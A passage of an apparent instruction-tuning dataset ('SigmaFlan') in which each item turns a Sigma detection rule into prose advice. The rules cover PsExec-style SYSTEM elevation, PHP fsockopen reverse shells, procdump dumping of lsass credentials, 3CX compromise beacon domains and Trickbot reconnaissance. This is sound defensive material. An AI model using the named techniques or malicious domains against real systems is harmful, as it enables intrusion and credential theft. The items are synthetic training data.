    "output": "Sure!\nIn order to detect unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM privileges, you should monitor the creation of Windows processes for specific command-line arguments that indicate an elevation attempt to the LOCAL_SYSTEM account. These arguments include variations of '-s' and '/s' flags in combination with 'cmd', 'powershell', 'pwsh', or any similar command line interpreter software, often paired with '-i' or '/i' to start an interactive session. It's crucial to note that these flags can be used interchangeably (e.g., '-' can be replaced with '/') and the order of the arguments might not always be the same. Furthermore, variations specific to PowerShell version 7 (pwsh) and version 5 (powershell) are also considered. To avoid false alerts, the rule excludes known instances where command-line arguments include 'paexec', 'PsExec', or 'accepteula', as they are common tools that use similar flags but may not indicate malicious activity. These command-line arguments are typically associated with legitimate administrative tools, and exclusions are made for instances that may resemble typical tool usage or instances where software companies include such tools with their products under different names. This detection process is set to a high level of alert due to the potential impact of an attacker gaining SYSTEM privileges.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges",
      "answer": "In order to detect unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM privileges, you should monitor the creation of Windows processes for specific command-line arguments that indicate an elevation attempt to the LOCAL_SYSTEM account. These arguments include variations of '-s' and '/s' flags in combination with 'cmd', 'powershell', 'pwsh', or any similar command line interpreter software, often paired with '-i' or '/i' to start an interactive session. It's crucial to note that these flags can be used interchangeably (e.g., '-' can be replaced with '/') and the order of the arguments might not always be the same. Furthermore, variations specific to PowerShell version 7 (pwsh) and version 5 (powershell) are also considered. To avoid false alerts, the rule excludes known instances where command-line arguments include 'paexec', 'PsExec', or 'accepteula', as they are common tools that use similar flags but may not indicate malicious activity. These command-line arguments are typically associated with legitimate administrative tools, and exclusions are made for instances that may resemble typical tool usage or instances where software companies include such tools with their products under different names. This detection process is set to a high level of alert due to the potential impact of an attacker gaining SYSTEM privileges."
    }
  },
  {
    "instruction": "Can you explain how to detect: when an Network Zone is Deactivated or Deleted.",
    "context": "",
    "output": "Certainly!\n\nIn order to Detects when a Network Zone is Deactivated or Deleted, you should: Monitor Okta log data for events that indicate a network zone has been deactivated or deleted. Specifically, look for events with the type 'zone.deactivate' or 'zone.delete' within the Okta logging service. These actions could signify potentially malicious activity as deactivating or deleting network zones could impact the accessibility or security of network resources. It is categorized with a medium level of importance. Note that while monitoring for these events, there might be instances where actions are not malicious and are considered to be false positives, the nature of which may be unknown without further context.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when an Network Zone is Deactivated or Deleted.",
      "answer": "In order to Detects when a Network Zone is Deactivated or Deleted, you should: Monitor Okta log data for events that indicate a network zone has been deactivated or deleted. Specifically, look for events with the type 'zone.deactivate' or 'zone.delete' within the Okta logging service. These actions could signify potentially malicious activity as deactivating or deleting network zones could impact the accessibility or security of network resources. It is categorized with a medium level of importance. Note that while monitoring for these events, there might be instances where actions are not malicious and are considered to be false positives, the nature of which may be unknown without further context."
    }
  },
  {
    "instruction": "Can you explain how to detect: Detect when a user has reset their password in Azure AD",
    "context": "",
    "output": "Certainly!\n\nIn order to detect when a user has reset their password in Azure AD, you should monitor Azure audit logs focusing on the user management category with a successful status where the action has been initiated by a User Principal Name (UPN). Additionally, it's crucial to filter out events where the target contains a UPN and the activity type involves a password reset. This approach is aimed at identifying instances where a password reset has been performed, which may indicate a potential unauthorized or suspicious attempt to gain access. It is essential, however, to consider valid scenarios such as an approved action by the system administrator or a confirmed user action, which could be identified as false positives. The detection level for this activity is considered medium, emphasizing the need for balance between vigilance and avoiding unnecessary alarm on regular user activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect when a user has reset their password in Azure AD",
      "answer": "In order to detect when a user has reset their password in Azure AD, you should monitor Azure audit logs focusing on the user management category with a successful status where the action has been initiated by a User Principal Name (UPN). Additionally, it's crucial to filter out events where the target contains a UPN and the activity type involves a password reset. This approach is aimed at identifying instances where a password reset has been performed, which may indicate a potential unauthorized or suspicious attempt to gain access. It is essential, however, to consider valid scenarios such as an approved action by the system administrator or a confirmed user action, which could be identified as false positives. The detection level for this activity is considered medium, emphasizing the need for balance between vigilance and avoiding unnecessary alarm on regular user activities."
    }
  },
  {
    "instruction": "How can I detect: An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.\nWith this alert, it is used to detect anyone is changing password on behalf of other users.\n",
    "context": "",
    "output": "In order to detect anyone changing the password on behalf of other users, which indicates that an attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile set up, you should focus on monitoring AWS CloudTrail logs. Look for events where the event source is IAM (iam.amazonaws.com) specifically with the event name \"UpdateLoginProfile\". This indicates an attempt to update a login profile, which is a key part of this detection. \n\nFurthermore, it's important to apply a filter to identify suspicious behavior accurately. This involves checking if the ARN (Amazon Resource Name) of the user identity making the request contains the username in the request parameters. If the ARN of the user initiating the request does not match the username for which the login profile is being updated, this can signify malicious activity, such as an unauthorized user attempting to change another user's password. \n\nHowever, it is important to note that certain activities that match these criteria might be legitimate, such as administrators performing routine account maintenance. These are considered potential false positives, specifically actions categorized under legit user account administration.\n\nFor effective monitoring, the following fields should be included in the analysis: the ARN of the user identity (`userIdentity.arn`), the username in the request parameters (`requestParameters.userName`), the error code (`errorCode`), and the error message (`errorMessage`). These fields can provide additional context to distinguish between legitimate and malicious activities.\n\nThe detection of such activities is crucial and is flagged at a high level due to the severity of the potential impact, including unauthorized access to AWS resources.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.\nWith this alert, it is used to detect anyone is changing password on behalf of other users.\n",
      "answer": "In order to detect anyone changing the password on behalf of other users, which indicates that an attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile set up, you should focus on monitoring AWS CloudTrail logs. Look for events where the event source is IAM (iam.amazonaws.com) specifically with the event name \"UpdateLoginProfile\". This indicates an attempt to update a login profile, which is a key part of this detection. \n\nFurthermore, it's important to apply a filter to identify suspicious behavior accurately. This involves checking if the ARN (Amazon Resource Name) of the user identity making the request contains the username in the request parameters. If the ARN of the user initiating the request does not match the username for which the login profile is being updated, this can signify malicious activity, such as an unauthorized user attempting to change another user's password. \n\nHowever, it is important to note that certain activities that match these criteria might be legitimate, such as administrators performing routine account maintenance. These are considered potential false positives, specifically actions categorized under legit user account administration.\n\nFor effective monitoring, the following fields should be included in the analysis: the ARN of the user identity (`userIdentity.arn`), the username in the request parameters (`requestParameters.userName`), the error code (`errorCode`), and the error message (`errorMessage`). These fields can provide additional context to distinguish between legitimate and malicious activities.\n\nThe detection of such activities is crucial and is flagged at a high level due to the severity of the potential impact, including unauthorized access to AWS resources."
    }
  },
  {
    "instruction": "Please help me detect the following: \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.",
    "context": "",
    "output": "Sure!\nIn order to detect a \"dllhost\" process spawning with no command line arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes, you should: monitor process creation events for the Windows operating system. Specifically, look for instances where a process named 'dllhost.exe' is created. Importantly, this detection focuses on 'dllhost.exe' processes that are started without any command-line arguments, a scenario that is unusual and could signify malicious behavior such as process injection or an attempt by malware to impersonate critical system processes. It's recommended to treat these occurrences with a high level of suspicion as there are unlikely to be false positives associated with this detection pattern.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "\"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.",
      "answer": "In order to detect a \"dllhost\" process spawning with no command line arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes, you should: monitor process creation events for the Windows operating system. Specifically, look for instances where a process named 'dllhost.exe' is created. Importantly, this detection focuses on 'dllhost.exe' processes that are started without any command-line arguments, a scenario that is unusual and could signify malicious behavior such as process injection or an attempt by malware to impersonate critical system processes. It's recommended to treat these occurrences with a high level of suspicion as there are unlikely to be false positives associated with this detection pattern."
    }
  },
  {
    "instruction": "Can you explain how to detect: usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code. The rule looks for calls to the \"fsockopen\" function which allows the creation of sockets.\nAttackers often leverage this in combination with functions such as \"exec\" or \"fopen\" to initiate a reverse shell connection.\n",
    "context": "",
    "output": "Certainly!\n\nIn order to detect usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code, with a focus on identifying calls to the \"fsockopen\" function that enable the creation of sockets, often utilized by attackers in conjunction with functions like \"exec\" or \"fopen\" to initiate a reverse shell connection, you should: Monitor process creation logs on Linux systems for any instances where the image path includes '/php', signaling the invocation of PHP. Specifically, look for command line executions containing the '-r' argument, indicative of inline PHP code execution, and the presence of the 'fsockopen' function within these commands. Additionally, pay attention to the use of common shell environments as part of the command line, which includes 'ash', 'bash', 'bsh', 'csh', 'ksh', 'pdksh', 'sh', 'tcsh', and 'zsh'. These shells might be invoked by attackers to execute further malicious scripts or commands post-exploitation. Given the high level of risk associated with this behavior, it's crucial to carefully examine such activities, while keeping in mind that there may be unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code. The rule looks for calls to the \"fsockopen\" function which allows the creation of sockets.\nAttackers often leverage this in combination with functions such as \"exec\" or \"fopen\" to initiate a reverse shell connection.\n",
      "answer": "In order to detect usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code, with a focus on identifying calls to the \"fsockopen\" function that enable the creation of sockets, often utilized by attackers in conjunction with functions like \"exec\" or \"fopen\" to initiate a reverse shell connection, you should: Monitor process creation logs on Linux systems for any instances where the image path includes '/php', signaling the invocation of PHP. Specifically, look for command line executions containing the '-r' argument, indicative of inline PHP code execution, and the presence of the 'fsockopen' function within these commands. Additionally, pay attention to the use of common shell environments as part of the command line, which includes 'ash', 'bash', 'bsh', 'csh', 'ksh', 'pdksh', 'sh', 'tcsh', and 'zsh'. These shells might be invoked by attackers to execute further malicious scripts or commands post-exploitation. Given the high level of risk associated with this behavior, it's crucial to carefully examine such activities, while keeping in mind that there may be unknown false positives."
    }
  },
  {
    "instruction": "How can I detect: potential suspicious winget package installation from a suspicious source.",
    "context": "",
    "output": "In order to detect potential suspicious winget package installation from a suspicious source, you should monitor the creation of stream hash logs on Windows systems. Specifically, look for entries where the content begins with '[ZoneTransfer] ZoneId=3', indicating a file downloaded from the Internet. Furthermore, scrutinize any content that contains URLs with a single digit following the '://', which might be indicative of an untrusted source. It's also crucial to pay attention to target filenames ending with ':Zone.Identifier' and containing the path '\\AppData\\Local\\Temp\\WinGet\\', as these are hallmarks of files associated with winget package installations. The condition for detecting suspicious activity rests on these specific criteria being met. While there are possibilities for false positives, given the nature of these indicators, the level of concern is classified as high, underscoring the importance of vigilance for such patterns to mitigate potential threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential suspicious winget package installation from a suspicious source.",
      "answer": "In order to detect potential suspicious winget package installation from a suspicious source, you should monitor the creation of stream hash logs on Windows systems. Specifically, look for entries where the content begins with '[ZoneTransfer] ZoneId=3', indicating a file downloaded from the Internet. Furthermore, scrutinize any content that contains URLs with a single digit following the '://', which might be indicative of an untrusted source. It's also crucial to pay attention to target filenames ending with ':Zone.Identifier' and containing the path '\\AppData\\Local\\Temp\\WinGet\\', as these are hallmarks of files associated with winget package installations. The condition for detecting suspicious activity rests on these specific criteria being met. While there are possibilities for false positives, given the nature of these indicators, the level of concern is classified as high, underscoring the importance of vigilance for such patterns to mitigate potential threats."
    }
  },
  {
    "instruction": "Explain how should I detect the following: uncommon \"conhost\" child processes. This could be a sign of \"conhost\" usage as a LOLBIN or potential process injection activity.",
    "context": "",
    "output": "In order to detect uncommon \"conhost\" child processes, which could be a sign of \"conhost\" usage as a LOLBIN or potential process injection activity, you should monitor for process creation events within the Windows operating environment. Specifically, focus on processes that have been spawned by 'conhost.exe' as their parent image. This is an indicator of suspicious activity since 'conhost.exe' commonly does not spawn child processes under normal circumstances.\n\nBe aware of false positives that might arise from specific system or third-party software behaviors. These include known benign processes from the SystemTraceProvider-Process provider that might falsely appear malicious due to their association with 'conhost.exe'. Additionally, process creation events related to Git operations, such as using 'git.exe' with commands like 'show --textconv' or 'cat-file -s', might be mistakenly flagged when they originate from or involve 'conhost.exe'. Therefore, these should be considered when evaluating potential threats.\n\nFurthermore, pay close attention to the command lines used in these process creation events. Specifically, scrutinize processes with command lines indicating a parent process of 'conhost.exe' attempting to execute Git commands, as well as any use of 'conhost.exe' with unusual flags that might suggest an attempt to force certain behaviors or compatibility modes.\n\nBy applying these detection strategies, while also excluding known legitimate usage patterns of 'conhost.exe' related to specific provider names, Git operations, and certain command line patterns, you can more effectively identify potentially malicious activity involving 'conhost.exe'. This approach helps in reducing the noise from false positives and focusing on events that are more likely indicative of an attack involving LOLBINs or process injection techniques.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "uncommon \"conhost\" child processes. This could be a sign of \"conhost\" usage as a LOLBIN or potential process injection activity.",
      "answer": "In order to detect uncommon \"conhost\" child processes, which could be a sign of \"conhost\" usage as a LOLBIN or potential process injection activity, you should monitor for process creation events within the Windows operating environment. Specifically, focus on processes that have been spawned by 'conhost.exe' as their parent image. This is an indicator of suspicious activity since 'conhost.exe' commonly does not spawn child processes under normal circumstances.\n\nBe aware of false positives that might arise from specific system or third-party software behaviors. These include known benign processes from the SystemTraceProvider-Process provider that might falsely appear malicious due to their association with 'conhost.exe'. Additionally, process creation events related to Git operations, such as using 'git.exe' with commands like 'show --textconv' or 'cat-file -s', might be mistakenly flagged when they originate from or involve 'conhost.exe'. Therefore, these should be considered when evaluating potential threats.\n\nFurthermore, pay close attention to the command lines used in these process creation events. Specifically, scrutinize processes with command lines indicating a parent process of 'conhost.exe' attempting to execute Git commands, as well as any use of 'conhost.exe' with unusual flags that might suggest an attempt to force certain behaviors or compatibility modes.\n\nBy applying these detection strategies, while also excluding known legitimate usage patterns of 'conhost.exe' related to specific provider names, Git operations, and certain command line patterns, you can more effectively identify potentially malicious activity involving 'conhost.exe'. This approach helps in reducing the noise from false positives and focusing on events that are more likely indicative of an attack involving LOLBINs or process injection techniques."
    }
  },
  {
    "instruction": "How can I detect: set of suspicious network related commands often used in recon stages",
    "context": "",
    "output": "In order to detect a set of suspicious network related commands often used in recon stages, you should: Monitor for the creation of processes in Windows systems, specifically looking for commands that involve the usage of 'nslookup' together with '_ldap._tcp.dc._msdcs.' This particular command sequence is a red flag for reconnaissance activities as it may indicate an attempt to gather information about domain controllers within a Microsoft Domain. Such activities often precede more malicious actions and are key indicators of the initial phases of an attack. It is important to consider that some legitimate scripts and administrative tools could trigger similar alerts, so any detection should be investigated to rule out or confirm malicious intent. This monitoring activity falls under the broader category of identifying reconnaissance techniques, which is a fundamental part of maintaining a secure network environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "set of suspicious network related commands often used in recon stages",
      "answer": "In order to detect a set of suspicious network related commands often used in recon stages, you should: Monitor for the creation of processes in Windows systems, specifically looking for commands that involve the usage of 'nslookup' together with '_ldap._tcp.dc._msdcs.' This particular command sequence is a red flag for reconnaissance activities as it may indicate an attempt to gather information about domain controllers within a Microsoft Domain. Such activities often precede more malicious actions and are key indicators of the initial phases of an attack. It is important to consider that some legitimate scripts and administrative tools could trigger similar alerts, so any detection should be investigated to rule out or confirm malicious intent. This monitoring activity falls under the broader category of identifying reconnaissance techniques, which is a fundamental part of maintaining a secure network environment."
    }
  },
  {
    "instruction": "Please help me detect the following: SILENTTRINITY stager dll loading activity",
    "context": "",
    "output": "Sure!\nIn order to detect SILENTTRINITY stager dll loading activity, you should: Monitor image loading logs on Windows systems, specifically looking for events where the description field contains the text 'st2stager'. This indication of SILENTTRINITY stager dll being loaded into memory is a critical signature of the attack technique in use. Given the nature of this detection, false positives are considered unlikely, signifying a high level of confidence in the specificity of this monitoring strategy for identifying malicious activity related to SILENTTRINITY.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "SILENTTRINITY stager dll loading activity",
      "answer": "In order to detect SILENTTRINITY stager dll loading activity, you should: Monitor image loading logs on Windows systems, specifically looking for events where the description field contains the text 'st2stager'. This indication of SILENTTRINITY stager dll being loaded into memory is a critical signature of the attack technique in use. Given the nature of this detection, false positives are considered unlikely, signifying a high level of confidence in the specificity of this monitoring strategy for identifying malicious activity related to SILENTTRINITY."
    }
  },
  {
    "instruction": "How can I detect: potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise",
    "context": "",
    "output": "In order to detect potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise, you should: Monitor DNS query logs on Windows systems for queries to a specific list of domains that are associated with malicious activities. Look for queries to domains such as 'akamaicontainer.com', 'akamaitechcloudservices.com', 'azuredeploystore.com', 'azureonlinecloud.com', 'azureonlinestorage.com', 'dunamistrd.com', 'glcloudservice.com', 'journalide.org', 'msedgepackageinfo.com', 'msedgeupdate.net', 'msstorageazure.com', 'msstorageboxes.com', 'officeaddons.com', 'officestoragebox.com', 'pbxcloudeservices.com', 'pbxphonenetwork.com', 'pbxsources.com', 'qwepoi123098.com', 'sbmsa.wiki', 'sourceslabs.com', 'visualstudiofactory.com', and 'zacharryblogs.com'. These domains have been linked to beaconing behavior indicative of a compromised 3CXDesktopApp. The detection of queries to these domains should be considered a high-level security concern due to the unlikely chance of false positives, suggesting a very specific and targeted attack behavior. This activity aligns with tactics and techniques related to command and control as well as initial access, where attackers establish communication with compromised systems to control them or exfiltrate data.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise",
      "answer": "In order to detect potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise, you should: Monitor DNS query logs on Windows systems for queries to a specific list of domains that are associated with malicious activities. Look for queries to domains such as 'akamaicontainer.com', 'akamaitechcloudservices.com', 'azuredeploystore.com', 'azureonlinecloud.com', 'azureonlinestorage.com', 'dunamistrd.com', 'glcloudservice.com', 'journalide.org', 'msedgepackageinfo.com', 'msedgeupdate.net', 'msstorageazure.com', 'msstorageboxes.com', 'officeaddons.com', 'officestoragebox.com', 'pbxcloudeservices.com', 'pbxphonenetwork.com', 'pbxsources.com', 'qwepoi123098.com', 'sbmsa.wiki', 'sourceslabs.com', 'visualstudiofactory.com', and 'zacharryblogs.com'. These domains have been linked to beaconing behavior indicative of a compromised 3CXDesktopApp. The detection of queries to these domains should be considered a high-level security concern due to the unlikely chance of false positives, suggesting a very specific and targeted attack behavior. This activity aligns with tactics and techniques related to command and control as well as initial access, where attackers establish communication with compromised systems to control them or exfiltrate data."
    }
  },
  {
    "instruction": "Can you explain how to detect: usage of the \"Add-AppxPackage\" or it's alias \"Add-AppPackage\" to install unsigned AppX packages",
    "context": "",
    "output": "Certainly!\n\nIn order to detect usage of the \"Add-AppxPackage\" or its alias \"Add-AppPackage\" to install unsigned AppX packages, you should: Monitor Windows PowerShell script logs to identify any instances where scripts include the commands 'Add-AppPackage ' or 'Add-AppxPackage ', especially when these commands are combined with the flag ' -AllowUnsigned'. This monitoring is predicated on having Script Block Logging enabled to capture PowerShell script activities. It is important to be cautious as there may be legitimate reasons for installing unsigned packages, such as during testing phases. The risk level associated with this activity is deemed medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"Add-AppxPackage\" or it's alias \"Add-AppPackage\" to install unsigned AppX packages",
      "answer": "In order to detect usage of the \"Add-AppxPackage\" or its alias \"Add-AppPackage\" to install unsigned AppX packages, you should: Monitor Windows PowerShell script logs to identify any instances where scripts include the commands 'Add-AppPackage ' or 'Add-AppxPackage ', especially when these commands are combined with the flag ' -AllowUnsigned'. This monitoring is predicated on having Script Block Logging enabled to capture PowerShell script activities. It is important to be cautious as there may be legitimate reasons for installing unsigned packages, such as during testing phases. The risk level associated with this activity is deemed medium."
    }
  },
  {
    "instruction": "Please help me detect the following: renaming of an existing computer account to a account name that doesn't contain a $ symbol as seen in attacks against CVE-2021-42287",
    "context": "",
    "output": "Sure!\nIn order to detect the renaming of an existing computer account to an account name that doesn't contain a $ symbol as seen in attacks against CVE-2021-42287, you should: Monitor Windows security event logs for event ID 4781, which signifies a user account name change. Specifically, focus on instances where the old target username contains the '$' symbol, indicating it was likely a computer account, and ensure the new target username does not contain the '$' symbol. This pattern suggests an attempt to rename a computer account to a format not typical for such accounts, possibly indicating malicious activity linked to exploiting CVE-2021-42287. Be aware that there might be legitimate reasons for account name changes that do not involve a '$' symbol in the new name; hence, this activity is flagged with a high level of concern but should be investigated to rule out false positives. The key fields to review in the logs are the EventID and the SubjectUserName to understand the scope and nature of the change.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "renaming of an existing computer account to a account name that doesn't contain a $ symbol as seen in attacks against CVE-2021-42287",
      "answer": "In order to detect the renaming of an existing computer account to an account name that doesn't contain a $ symbol as seen in attacks against CVE-2021-42287, you should: Monitor Windows security event logs for event ID 4781, which signifies a user account name change. Specifically, focus on instances where the old target username contains the '$' symbol, indicating it was likely a computer account, and ensure the new target username does not contain the '$' symbol. This pattern suggests an attempt to rename a computer account to a format not typical for such accounts, possibly indicating malicious activity linked to exploiting CVE-2021-42287. Be aware that there might be legitimate reasons for account name changes that do not involve a '$' symbol in the new name; hence, this activity is flagged with a high level of concern but should be investigated to rule out false positives. The key fields to review in the logs are the EventID and the SubjectUserName to understand the scope and nature of the change."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process.\nThis way we are also able to catch cases in which the attacker has renamed the procdump executable.\n",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process, enabling the detection of cases in which the attacker has renamed the procdump executable, you should: Focus on monitoring the creation of processes within Windows. Specifically, look for instances where the command line includes '-ma' or '/ma', which are parameters possibly used in dumping the lsass process memory, a common target for attackers seeking to extract credentials. Also, be on the lookout for command line instances containing ' ls', a shorthand indicating operations targeting the lsass process. The occurrence of these specific command line flags in process creation events suggests a high likelihood of an attack, aiming to misuse the SysInternals Procdump utility for malicious purposes. Given that legitimate use of these command line options for dumping the lsass process memory is highly unlikely, any detection of such activity should be treated with suspicion. However, be mindful of potential false positives, for instance, from another tool utilizing command line flags that appear similar to those used by ProcDump.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process.\nThis way we are also able to catch cases in which the attacker has renamed the procdump executable.\n",
      "answer": "In order to detect suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process, enabling the detection of cases in which the attacker has renamed the procdump executable, you should: Focus on monitoring the creation of processes within Windows. Specifically, look for instances where the command line includes '-ma' or '/ma', which are parameters possibly used in dumping the lsass process memory, a common target for attackers seeking to extract credentials. Also, be on the lookout for command line instances containing ' ls', a shorthand indicating operations targeting the lsass process. The occurrence of these specific command line flags in process creation events suggests a high likelihood of an attack, aiming to misuse the SysInternals Procdump utility for malicious purposes. Given that legitimate use of these command line options for dumping the lsass process memory is highly unlikely, any detection of such activity should be treated with suspicion. However, be mindful of potential false positives, for instance, from another tool utilizing command line flags that appear similar to those used by ProcDump."
    }
  },
  {
    "instruction": "How can I detect: issues with Windows Defender Real-Time Protection features",
    "context": "",
    "output": "In order to detect issues with Windows Defender Real-Time Protection features, you should focus on monitoring Windows Defender (WinDefend) logs for specific event IDs that indicate problems with Real-Time Protection functionality. Look for events 3002, which signals that the Real-Time Protection feature has encountered an error and failed, and 3007, indicating that the Real-Time Protection feature has restarted. These events are critical as they can imply that the system's defense mechanisms against malware and other threats are compromised.\n\nHowever, it's also important to filter out false positives that might arise from optional network inspection features. Specifically, ignore alerts that stem from the Network Inspection System (Feature_Name '%%886'), especially those related to the system missing updates required for running the Network Inspection System (Reason '%%892'), or instances where the antimalware security intelligence has stopped functioning for an unknown reason (Reason '%%858'). In these cases, the issue might be resolved by installing required updates or restarting the service, and they may not directly indicate a significant problem with the Real-Time Protection features.\n\nBe aware that some crashes can sometimes occur, which do not provide enough information to accurately tune out these cases. Therefore, manual investigation and exception handling might be required for such instances. The importance of monitoring these specific events is categorized at a medium level, highlighting their significance in maintaining the integrity of Windows Defender's real-time protection against threats. This monitoring approach aligns with detection strategies for identifying potential disruptions or failures in systems designed to protect against malware, unauthorized access, and other security threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "issues with Windows Defender Real-Time Protection features",
      "answer": "In order to detect issues with Windows Defender Real-Time Protection features, you should focus on monitoring Windows Defender (WinDefend) logs for specific event IDs that indicate problems with Real-Time Protection functionality. Look for events 3002, which signals that the Real-Time Protection feature has encountered an error and failed, and 3007, indicating that the Real-Time Protection feature has restarted. These events are critical as they can imply that the system's defense mechanisms against malware and other threats are compromised.\n\nHowever, it's also important to filter out false positives that might arise from optional network inspection features. Specifically, ignore alerts that stem from the Network Inspection System (Feature_Name '%%886'), especially those related to the system missing updates required for running the Network Inspection System (Reason '%%892'), or instances where the antimalware security intelligence has stopped functioning for an unknown reason (Reason '%%858'). In these cases, the issue might be resolved by installing required updates or restarting the service, and they may not directly indicate a significant problem with the Real-Time Protection features.\n\nBe aware that some crashes can sometimes occur, which do not provide enough information to accurately tune out these cases. Therefore, manual investigation and exception handling might be required for such instances. The importance of monitoring these specific events is categorized at a medium level, highlighting their significance in maintaining the integrity of Windows Defender's real-time protection against threats. This monitoring approach aligns with detection strategies for identifying potential disruptions or failures in systems designed to protect against malware, unauthorized access, and other security threats."
    }
  },
  {
    "instruction": "Can you explain how to detect: execution of regsvr32 where the DLL is located in a highly suspicious locations",
    "context": "",
    "output": "Certainly!\n\nIn order to detect execution of regsvr32 where the DLL is located in highly suspicious locations, you should:\n\nMonitor the creation of processes on Windows systems, focusing specifically on instances where regsvr32.exe is executed. This includes both cases where the image's name ends with '\\regsvr32.exe' and where the original file name is 'REGSVR32.EXE'. Additionally, you should examine the command line paths for indications that executable files are being accessed from unusual or suspicious directories. These include paths that lead to system directories known for storing logs, temporary files, and other sensitive system data, such as '\\PerfLogs\\', '\\Temp\\', various subdirectories within '\\Windows\\System32\\', and more.\n\nPay attention to command lines that contain paths starting with drive letters such as \"C:\\\" or \"D:\\\" to isolate attempts that might try to disguise malicious intent by blending in with regular system paths. However, it is important to exclude from alerts the known directories that host legitimate third-party applications and system files, like those under 'C:\\Program Files', 'C:\\ProgramData', and 'C:\\Users', including specific exclusions for spaces preceding 'C:\\Windows\\' paths to avoid false positives related to the regsvr32 binary's legitimate activities.\n\nThe logic should ensure that command lines that are empty or null, which could indicate tampering to evade detection, do not trigger false alerts. This approach minimizes the risk of false positives while maintaining high alert fidelity for detecting suspicious uses of regsvr32, indicating potential stealthy maneuvers designed to register DLLs from locations typically not associated with benign activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of regsvr32 where the DLL is located in a highly suspicious locations",
      "answer": "In order to detect execution of regsvr32 where the DLL is located in highly suspicious locations, you should:\n\nMonitor the creation of processes on Windows systems, focusing specifically on instances where regsvr32.exe is executed. This includes both cases where the image's name ends with '\\regsvr32.exe' and where the original file name is 'REGSVR32.EXE'. Additionally, you should examine the command line paths for indications that executable files are being accessed from unusual or suspicious directories. These include paths that lead to system directories known for storing logs, temporary files, and other sensitive system data, such as '\\PerfLogs\\', '\\Temp\\', various subdirectories within '\\Windows\\System32\\', and more.\n\nPay attention to command lines that contain paths starting with drive letters such as \"C:\\\" or \"D:\\\" to isolate attempts that might try to disguise malicious intent by blending in with regular system paths. However, it is important to exclude from alerts the known directories that host legitimate third-party applications and system files, like those under 'C:\\Program Files', 'C:\\ProgramData', and 'C:\\Users', including specific exclusions for spaces preceding 'C:\\Windows\\' paths to avoid false positives related to the regsvr32 binary's legitimate activities.\n\nThe logic should ensure that command lines that are empty or null, which could indicate tampering to evade detection, do not trigger false alerts. This approach minimizes the risk of false positives while maintaining high alert fidelity for detecting suspicious uses of regsvr32, indicating potential stealthy maneuvers designed to register DLLs from locations typically not associated with benign activities."
    }
  },
  {
    "instruction": "How can I detect: potential reconnaissance activity used by Trickbot malware. Trickbot enumerates domain/network topology and executes certain commands automatically every few minutes.",
    "context": "",
    "output": "In order to detect potential reconnaissance activity used by Trickbot malware, which enumerates domain/network topology and executes certain commands automatically every few minutes, you should: Monitor process creation logs on Windows systems for instances where the parent process is 'cmd.exe' and the child process is 'nltest.exe' executing the command line containing '/domain_trusts /all_trusts'. This pattern of activity is indicative of Trickbot's behavior to understand the network's structure, possibly for future malicious actions. Be aware that similar commands might occasionally be used by system administrators for legitimate purposes, so it's important to investigate potential hits before making a definitive assessment. The significance of detecting this pattern is classified as high due to its association with known malicious intent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential reconnaissance activity used by Trickbot malware. Trickbot enumerates domain/network topology and executes certain commands automatically every few minutes.",
